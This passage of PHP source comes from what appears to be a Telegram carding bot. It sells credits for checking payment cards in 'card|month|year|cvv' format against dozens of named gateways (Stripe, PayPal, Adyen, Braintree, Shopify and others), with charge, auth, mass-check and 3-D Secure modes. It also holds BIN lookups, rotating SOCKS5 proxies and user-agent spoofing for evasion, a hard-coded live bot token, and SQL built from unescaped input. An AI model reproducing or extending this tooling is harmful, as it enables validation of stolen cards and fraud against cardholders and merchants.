        bot('sendMessage', ['chat_id'=>-1001959796322, 'message_id'=>$messageidtoedit, 'text'=>$text, 'parse_mode'=>'html', 'reply_to_message_id'=> $message_id]);
        die();
    }

}
        
#------------------------------------------------------------------------------#
function is_duro(){
    global $userId; global $Mi_Id; global $message_id; global $chatId;
    if(true != verifiAdmin($userId) && $userId != '5168647868' && $userId != '5358612076'){
      bot('sendMessage', [
                'chat_id' =>$chatId,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>No tiene Permiso</b>",
                ]);       
    die();
            }
        }
#-----------------------------------------------------------------------------#
function is_credits(){
    global $userId; global $db; global $message_id; global $chatId;
    echo "Procesando... 1 Filtro";
    $db->where ("userdid", $userId);
    $count = $db->getValue ("creditos", "count(*)");
    $db->where ("userdid", $userId);
    $user = $db->getOne ("creditos");
    $cred_count = $user["creditos"];
    if ($cred_count <= 5 || $count == 0) {
        echo "No tiene Creditos Suficientes";
        bot('sendMessage', [
            'chat_id' =>$chatId,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
            'text' =>"<b>You do not have enough credits</b>",
            'reply_markup'=> json_encode(['inline_keyboard'=>[
                [['text'=>"Buy",'url'=>"https://t.me/NovaStranger"]]
                ],'resize_keyboard'=>true])
            ]);       
            die();
    }else{
        echo "Procesando .... $cred_count";
    }

}
#------------------------------------------------------------------------------#





function Exyrad($cc, $max_extra = 500){
  $bin = substr($cc, 0, 6);
  $extra = array();
  $value = 0;
  $archibo = fopen("extra.txt", "r") ;
  while(!feof($archibo)){
    $Oksio = fgets($archibo);
    $binExtra = substr($Oksio, 0, 6);
    if($binExtra == $bin) {
      $extra[$value] = $Oksio;
      $value = $value + 1;   
    }
    if ($max_extra > 0 && $value >= $max_extra) {
      break;
    }
  }
  return implode("", $extra);       
}




function Credis($userId)
{
    global $roles;
    $veripremium = "SELECT * FROM creditos WHERE userdid='$userId'";
    $res = mysqli_query($roles, $veripremium);
    if (mysqli_num_rows($res) != 0) {
        while ($fila = mysqli_fetch_array($res)) {
            $row = array();
            $fila[$row];
            return $fila;
        }
    } else {
        return False;
    }
}

function random_ua() {
    $tiposDisponiveis = array("Chrome", "Firefox", "Opera", "Explorer");
    $tipoNavegador = $tiposDisponiveis[array_rand($tiposDisponiveis)];
    switch ($tipoNavegador) {
        case 'Chrome':
            $navegadoresChrome = array("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
            );
            return $navegadoresChrome[array_rand($navegadoresChrome)];
            break;
        case 'Firefox':
            $navegadoresFirefox = array("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
                'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
            );
            return $navegadoresFirefox[array_rand($navegadoresFirefox)];
            break;
        case 'Opera':
            $navegadoresOpera = array("Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
                'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
                'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
                'Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02',
                'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00',
                'Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00',
                'Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00',
                'Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
        case 'Explorer':
            $navegadoresOpera = array("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
    }
}

function infouser($userId) {
    global $base_bot;
    if (empty($userId)) {
        return false; // Return false if userId is empty to prevent SQL error
    }
    $base_bot->conectar();
    $query = "SELECT * FROM prmiumtime WHERE userid = $userId LIMIT 1";
    $query = $base_bot->consulta($query);
    
    return $query[0];
}

function CookieMx($userId) {
    global $roles;

    $query = "SELECT * FROM Amx_cookie WHERE userid= $userId LIMIT 1";
    $result = mysqli_query($roles, $query);

    if ($result && mysqli_num_rows($result) > 0) {
        return mysqli_fetch_assoc($result);
    }

    return false;
}


function logsummary($summary){
    bot('sendmessage',[
        'chat_id'=> -1001959796322,
        'text'=>$summary,
        'parse_mode'=>'html'
        
    ]);
}

Function deltecred($id){
    global $db;
    echo "Procesando... 1";
    $db->where ("userdid", $id);
    $count = $db->getValue ("creditos", "count(*)");
    if ($count == 0) {
        echo "Does not exist db";
        return;
    }
    echo "Procesando... 2";
    $db->where ("userdid", $id);
    $user = $db->getOne ("creditos");
    $cred_count = $user["creditos"];
    if ($cred_count <= 0){
        $db->where('userdid', $id);
        if($db->delete('creditos')) echo 'successfully deleted';
    }else{
        echo "Aun Tiene Suficiente Creditos $cred_count";  
    }
}

function USERCRED($userID){
        global $roles;
        $veripremium = "SELECT * FROM `creditos` WHERE `userdid`='$userID'";
        $res = mysqli_query($roles, $veripremium);
        if (mysqli_num_rows($res) != 0) {
            return true;
        }else{
            #logsummary("ERROR");
            return False;
        }
    }
    

function antispFree($userID){
        global $roles;
         $sql = "UPDATE antispam set last_checked_on = '".time()."' WHERE userid = '$userID'";
         $result21 = mysqli_query($roles, $sql);
        }
    
function antisppre($userID){
        global $roles;
         $sql = "UPDATE antispampremiun set last_checked_on = '".time()."' WHERE userid = '$userID'";
         $result21 = mysqli_query($roles, $sql);
        }
        
function bininfo($bin) {
    global $base_bot;
    $base_bot->conectar();
    $query = "SELECT * FROM bins WHERE bin='$bin' LIMIT 1";
    $query = $base_bot->consulta($query);
    

    return $query[0];
}

#..... Verifcador Chat...#
function verifiCharAdmin($userID){
        global $roles;
        $chatidd = "SELECT * FROM `gruoptime` WHERE `gruopid`='$userID'";
        $res = mysqli_query($roles, $chatidd);
        if (mysqli_num_rows($res) != 0) {
            return true;
        }else{
            #logsummary("ERROR");
            return False;
        }
    }
    
function griuppremi($bin){ 
    global $base_bot;
    $base_bot->conectar();
    $query = "SELECT `timedate` FROM `gruoptime` WHERE gruopid=$bin";
    $query = $base_bot->consulta($query);
    

    return $query[0]['timedate'];
}
function getUserRank($userId, $chatId, $Mi_Id) {
    $nui = infouser($userId);
    $Rank = $nui['apodo'];
    if ($userId == '5168647868') {
        $Rank = "Owner";
    } elseif ($userId == verifiAdmin($userId)) {
        $Rank = "Admin";
    } elseif ($userId == veritimepremium($userId)) {
        $Rank = $nui['apodo'];
    } elseif ($chatId == verifiCharAdmin($chatId)) {
        $Rank = "Free User";
    } elseif ($userId == verifiUser($userId)) {
        $Rank = "Free user";
    } else {
        $Rank = "Free user";
    }
    return $Rank;
}

function check_bin_and_user_status($lista, $chatId, $message_id, $keyboard, $userId) {
    $bin = substr($lista, 0, 6);
    $bines = bannedbin($bin);
    if ($bines == true) {
        return reply_to($chatId, $message_id, $keyboard, "<b>Bin Banned</b>.");
        exit();
    }
    if ($userId == verifniBan($userId)) {
        return sendMessage($chatId, $keyboard, "<b>🚷- [Status Ban] Te Encuentra ban no puedes hacer uso de ningún comando del bot%0AID : $userId</b>.");
        die();
    }
}


function deletegroup($userId)
{
    global $roles;
    $remainingTime = griuppremi($userId) - time();

    if ($remainingTime <= 0){
        $sql = "DELETE FROM gruoptime WHERE gruopid=$userId";
        if (mysqli_query($roles, $sql)) {
            logsummary("<b>El Chat Id = <code>$userId </code>ha sido eliminado de Grupo.</b>");
        } else {
            #logsummary("<b>Ha ocurrido un error al eliminar el usuario $userId de Premium: " . mysqli_error($roles) . "</b>");
        }
    }
}


function editMessageCaption($cchatid2,$keyboard,$message,$message_id2) {
       
    $url = $GLOBALS[website]."/editMessageCaption?chat_id=".$cchatid2."&caption=".$message."&reply_to_message_id=".$message_id2."&parse_mode=HTML";
    file_get_contents($url);
   
}


function Gater($Gaterr){
    global $roles;
    $veripremium = "SELECT * FROM `gateroff` WHERE `Gater`='$Gaterr'";
    $res = mysqli_query($roles, $veripremium);
    if (mysqli_num_rows($res) != 0) {
        return true;
    }else{
        #logsummary("ERROR");
        return False;
    }
}

function is_gateroff($input) {
global $message_id,$chatId,$db;
    $db->where("name", $input);
    $gate = $db->getOne("gater_status");
    $reason = $gate['reason'];
    $date = $gate['date'];
    $status = $gate['status'];
    if($status == "OFF") { // función Gater no definida
        bot('sendMessage', [
      'chat_id' => $chatId,
      'reply_to_message_id' => $message_id,
      'parse_mode' => 'HTML',
      'text' => "<b>Gateway $input ️\nCommand Inactive Since:<code> $date </code>\nComment: $reason</b>"
    ]);
    $db->disconnect();
    die();
        
    } 
}



function BotProxyUser(){
    $http_proxy = explode("\n", file_get_contents('BotProxyUser.txt'));
    if (isset($http_proxy)) { 
        return $http_proxy[array_rand($http_proxy)]; 
    } else {
        return false;
    }
}
function BotProxyUrl(){
    $http_proxy = explode("\n", file_get_contents('BotProxyUrl.txt'));
    if (isset($http_proxy)) { 
        return $http_proxy[array_rand($http_proxy)]; 
    } else {
        return false;
    }
}
function Rotate_V2(){
    $http_proxy = explode("\n", file_get_contents('rotate.txt'));
    if (isset($http_proxy)) { 
        return $http_proxy[array_rand($http_proxy)]; 
    } else {
        return false;
    }
}


function socks5(){
    $http_proxy = explode("\n", file_get_contents('soip.txt'));
    if (isset($http_proxy)) { 
        return $http_proxy[array_rand($http_proxy)]; 
    } else {
        return false;
    }
}

function rotate()
{
    $retry = 0;

    start:
    if ($retry > 10) {
    return $rotate;
    }

    $rotate = Rotate_V2();
    $socks5 = socks5();

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, $socks5);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
    curl_setopt($ch, CURLOPT_URL, 'https://www.netflix.com/login');
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT,10);
    $curl = curl_exec($ch);

    if (empty($curl)) {
        $retry++;
        goto start;
    }

    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($http_code != 200) {
        $retry++;
        goto start;
    }

    return $rotate;
}


function StuGta($Gas){
    if(Gater($Gas) == $Gas){
        return "<code>Mant! ⚠️</code>";
    } else {
        return "<code>ON! ✅</code>";
    }
}

function StateGater($Gas,$comando) {
    $gaterResult = Gater($Gas);
    $gatewayAuth = "ϟ Gateway $Gas - Premium";

    if ($gaterResult == $Gas) {
        return "<b>$gatewayAuth \nFormato  » <code>/$comando card|month|year|cvv</code> </b>\nStatus: [<code>Mant! ⚠️</code>]  \nComment » None";
    } else {
        return "<b>$gatewayAuth \nFormato  » <code>/$comando card|month|year|cvv</code> </b>\nStatus: [<code>ON! ✅</code>] \nComment » None";
    }
}


function gaterfrom($name,$comando,$type,$pasarela) {
    global $db;
$db->where ("name", $name);
$user = $db->getOne ("gater_status");
$ays = $user['status'];
$ayr = $user['reason'];
$ayd = $user['date'];
if($ays == 'ONLINE'){
$text = "<b>Name: <code>$name</code> | Pasarela: <code>$pasarela</code>
Format: <code>$$comando card|month|year|cvv</code>
Plan: <code>$type</code> | Status: <code>ON! ✅</code>
Review: <code>$ayr | $ayd</code>
 </b>";
return $text;
}else{
$text = "<b>Name: <code>$name</code> | Pasarela: <code>$pasarela</code>
Format: <code>$$comando card|month|year|cvv</code>
Plan: <code>$type</code> | Status: <code>Mant! ⚠️</code>
Review: <code>$ayr | $ayd</code> </b>";
return $text;
}}


#GATER Auth
if ($cdata2 == "auth2"){
    if ($queryOriginId != $queryUserId) {
        $response = "Access denied, use your own buttons";
        answerCallbackQuery($queryId, $response, true);
        exit;
}
$idioma_cambiar = trim(IdiomaUser($queryOriginId));
if(empty($idioma_cambiar)){
  $idioma_cambiar = 'en';
}
    $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '«'.traducir("tools",$idioma_cambiar).'»', 'callback_data' => 'tool'],
            ['text' => 'Back', 'callback_data' => 'auth']
           
        ]
        ]];
        
//-----------------------




$freecommands = urlencode(traducir("<b>Commands: >_$-Auth! Gateways = Page: (2/2)
━ • ━━━━━━━━━━ • ━
".gaterfrom("Michilopotzli","mt","Premium","Moneri")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Recurly","chk","Free User","Recurly")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Anya","an","Free User","Add Payment")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("AliNova","ali","Premium","Adyen Auth")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Trvil","tlv","Premium","Auth")."
━ • ━━━━━━━━━━ • ━</b>",$idioma_cambiar));


$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
        }
        
        
if ($cdata2 == "auth"){
    if ($queryOriginId != $queryUserId) {
        $response = "Access denied, use your own buttons";
        answerCallbackQuery($queryId, $response, true);
        exit;
}


$idioma_cambiar = trim(IdiomaUser($queryOriginId));
if(empty($idioma_cambiar)){
  $idioma_cambiar = 'en';
}

    $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '«'.traducir("tools",$idioma_cambiar).'»', 'callback_data' => 'tool'],
            ['text' => 'Next', 'callback_data' => 'auth2'],
            ['text' => 'Back', 'callback_data' => 'tpgate']
           
        ]
        ]];
        


//-----------------------

$freecommands = urlencode(traducir("<b>Commands: >_$-Auth! Gateways = Page: (1/2)
━ • ━━━━━━━━━━ • ━
".gaterfrom("Morbiut","mbt","Free User","Stripe Auth")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Auth","at","Free User","Stripe Auth")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Nova","au","Premium","Add Payment")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Auth 2","nks","Free User","Stripe Auth")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Kroon","ko","Premium","Stripe Auth")."
━ • ━━━━━━━━━━ • ━</b>","en",$idioma_cambiar));




$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
        }



#gater charget 
if ($cdata2 == "gcharg"){
    if ($queryOriginId != $queryUserId) {
        $response = "Access denied, use your own buttons";
        answerCallbackQuery($queryId, $response, true);
        exit;
}
$idioma_cambiar = trim(IdiomaUser($queryOriginId));
if(empty($idioma_cambiar)){
  $idioma_cambiar = 'en';
}

    $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => 'Back', 'callback_data' => 'tpgate'],
            ['text' => 'Next', 'callback_data' => 'cchae2'],
            ['text' => '«'.traducir("tools",$idioma_cambiar).'»', 'callback_data' => 'tool']
           
           
        ]
        ]];
        


$freecommands = urlencode(traducir("<b>Commands: >_$-Charged! Gateways = Page: (1/6)
━ • ━━━━━━━━━━ • ━
".gaterfrom("Lazarus","zs","Free User","Stripe")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Dreyfus","dr","Premium","Paypal")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Mons","ms","Premium", "Adyen")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Braintre","br","Free User","Braintre")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Citlalli","ct","Premium","Shopify+B3")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("ShBraintre","sf","Premium","Shopify+B3")."
━ • ━━━━━━━━━━ • ━</b>",$idioma_cambiar));
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
        }



// ================ MASS =======================
if ($cdata2 == "mass"){
    if ($queryOriginId != $queryUserId) {
        $response = "Access denied, use your own buttons";
        answerCallbackQuery($queryId, $response, true);
        exit;
}
$idioma_cambiar = trim(IdiomaUser($queryOriginId));
if(empty($idioma_cambiar)){
  $idioma_cambiar = 'en';
}
    $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '«'.traducir("tools",$idioma_cambiar).'»', 'callback_data' => 'tool'],
            ['text' => 'Back', 'callback_data' => 'tpgate']
           
        ]
        ]];


$freecommands = urlencode(traducir("<b>Commands: >_$-MassChk! Gateways = Page: (1/1)
━ • ━━━━━━━━━━ • ━
".gaterfrom("Mass1","mass1","Creditos","Sh")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Mass2","mass2","Creditos","Sh")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Mass3","mass3","Creditos","Payeezy")."
━ • ━━━━━━━━━━ • ━</b>",$idioma_cambiar));
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
        }

// ============================================


if ($cdata2 == "cchae2"){
    if ($queryOriginId != $queryUserId) {
        $response = "Access denied, use your own buttons";
        answerCallbackQuery($queryId, $response, true);
        exit;
}

$idioma_cambiar = trim(IdiomaUser($queryOriginId));
if(empty($idioma_cambiar)){
  $idioma_cambiar = 'en';
}
    $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => 'Back', 'callback_data' => 'gcharg'],
             ['text' => 'Next', 'callback_data' => 'cchae3'],
            ['text' => '«'.traducir("tools",$idioma_cambiar).'»', 'callback_data' => 'tool']
           
           
        ]
        ]];
        


$freecommands = urlencode(traducir("<b>Commands: >_$-Charged! Gateways = Page: (2/6)
━ • ━━━━━━━━━━ • ━
".gaterfrom("Paypal","pp","Free User","Paypal")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Shopify","shp","Free User","Shopify Auth")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Isola","iz","Premium","Payflow")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Goblin","gb","Premium","UnkNown")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Poseidón","ps","Premium","Spreedly")."
━ • ━━━━━━━━━━ • ━</b>",$idioma_cambiar));
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
        }


if ($cdata2 == "cchae3"){
    if ($queryOriginId != $queryUserId) {
        $response = "Access denied, use your own buttons";
        answerCallbackQuery($queryId, $response, true);
        exit;
}
$idioma_cambiar = trim(IdiomaUser($queryOriginId));
if(empty($idioma_cambiar)){
  $idioma_cambiar = 'en';
}
    $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => 'Back', 'callback_data' => 'cchae2'],
             ['text' => 'Next', 'callback_data' => 'charged4'],
            ['text' => '«'.traducir("tools",$idioma_cambiar).'»', 'callback_data' => 'tool']
           
           
        ]
        ]];


$freecommands = urlencode(traducir("<b>Commands: >_$-Charged! Gateways = Page: (3/6)
━ • ━━━━━━━━━━ • ━
".gaterfrom("Yiris","ys","Premium","BluePay")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Rita","rt","Premium","Bolt")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Alexa","ax","Premium","Zuora")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Lytos","ly","Premium","Square Avs")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Samael","sm","Premium","Shopify")."
━ • ━━━━━━━━━━ • ━</b>",$idioma_cambiar));
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
        }
   
   


if ($cdata2 == "charged6"){
    if ($queryOriginId != $queryUserId) {
        $response = "Access denied, use your own buttons";
        answerCallbackQuery($queryId, $response, true);
        exit;
}
$idioma_cambiar = trim(IdiomaUser($queryOriginId));
if(empty($idioma_cambiar)){
  $idioma_cambiar = 'en';
}
       $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => 'Back', 'callback_data' => 'charged5'],
            ['text' => '«'.traducir("tools",$idioma_cambiar).'»', 'callback_data' => 'tool']
           
           
        ]
        ]];


$freecommands = urlencode(traducir("<b>Commands: >_$-Charged! Gateways = Page: (6/6)
━ • ━━━━━━━━━━ • ━
".gaterfrom("Adriana","adr","Premium","Braintre")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Soldier","sd","Premium","Square Avs")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Zara","za","Premium","Adyen")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Mercado Pago","mp","Premium","Mercado Pago")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Roxy","rx","Premium","Shopify + braintree")."
━ • ━━━━━━━━━━ • ━</b>",$idioma_cambiar));
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
        }
        
if ($cdata2 == "charged5"){
    if ($queryOriginId != $queryUserId) {
        $response = "Access denied, use your own buttons";
        answerCallbackQuery($queryId, $response, true);
        exit;
}

$idioma_cambiar = trim(IdiomaUser($queryOriginId));
if(empty($idioma_cambiar)){
  $idioma_cambiar = 'en';
}

    $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => 'Back', 'callback_data' => 'charged4'],
             ['text' => 'Next', 'callback_data' => 'charged6'],
            ['text' => '«'.traducir("tools",$idioma_cambiar).'»', 'callback_data' => 'tool']
           
           
        ]
        ]];


$freecommands = urlencode(traducir("<b>Commands: >_$-Charged! Gateways = Page: (5/6)
━ • ━━━━━━━━━━ • ━
".gaterfrom("Deimos","dm","Premium","Shopify")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Estrella","es","Premium","square")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Payflow","pw","Premium","Payflow")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Reality","rl","Premium","Braintre")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Inumaki","inu","Premium","Braintre Auth")."
━ • ━━━━━━━━━━ • ━</b>",$idioma_cambiar));
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
        }
        
        
if ($cdata2 == "charged4"){
    if ($queryOriginId != $queryUserId) {
        $response = "Access denied, use your own buttons";
        answerCallbackQuery($queryId, $response, true);
        exit;
}
$idioma_cambiar = trim(IdiomaUser($queryOriginId));
if(empty($idioma_cambiar)){
  $idioma_cambiar = 'en';
}
        
            $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => 'Back', 'callback_data' => 'cchae3'],
             ['text' => 'Next', 'callback_data' => 'charged5'],
            ['text' => '«'.traducir("tools",$idioma_cambiar).'»', 'callback_data' => 'tool']
           
           
        ]
        ]];


$freecommands = urlencode(traducir("<b>Commands: >_$-Charged! Gateways = Page: (4/6)
━ • ━━━━━━━━━━ • ━
".gaterfrom("Wolf","wf","Premium","Square Avs")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Never","ne","Premium","Payflow + AVS")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Undeer","ew","Premium","Payflow PRO")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Stranger","st","Premium","Payflow")."
━ • ━━━━━━━━━━ • ━
".gaterfrom("Noelle","nl","Premium","Charged AVS")."
━ • ━━━━━━━━━━ • ━</b>",$idioma_cambiar));
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
        }
        
        

        
    
$b3d = StuGta('B3D');
if ($cdata2 == "Vbv"){
    if ($queryOriginId != $queryUserId) {
        $response = "Access denied, use your own buttons";
        answerCallbackQuery($queryId, $response, true);
        exit;
}
$idioma_cambiar = trim(IdiomaUser($queryOriginId));
if(empty($idioma_cambiar)){
  $idioma_cambiar = 'en';
}
    $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => 'Back', 'callback_data' => 'tpgate'],
            ['text' => '«'.traducir("tools",$idioma_cambiar).'»', 'callback_data' => 'tool']
           
           
        ]
        ]];


$freecommands = urlencode(traducir("<b>Commands: >_$-VBV! Gateways = Page: (1/1)
━ • ━━━━━━━━━━ • ━
".gaterfrom("VBV","vbv","Free User","3D Braintre")."
━ • ━━━━━━━━━━ • ━</b>",$idioma_cambiar));
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot5456276655:AAFt3u9hGVZxA72kBJrTc9W-Bmp7CWjLJBA/editMessageCaption?chat_id=$cchatid2&caption=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
        }




function razon($Gaterr){
            global $roles;
            $veripremium = "SELECT `razon` FROM `gateroff` WHERE `Gater`='$Gaterr'";
            $res = mysqli_query($roles, $veripremium);
            if (mysqli_num_rows($res) != 0) {
                while ($fila = mysqli_fetch_array ($res)) {
                    return $fila['razon'];
                }
            }else{
                #logsummary("ERROR");
                return False;
            }
        }

function fecha($Gaterr){
            global $roles;
            $veripremium = "SELECT `date` FROM `gateroff` WHERE `Gater`='$Gaterr'";
            $res = mysqli_query($roles, $veripremium);
            if (mysqli_num_rows($res) != 0) {
                while ($fila = mysqli_fetch_array ($res)) {
                    return $fila['date'];
            }
        }else{
                #logsummary("ERROR");
                return False;
            }
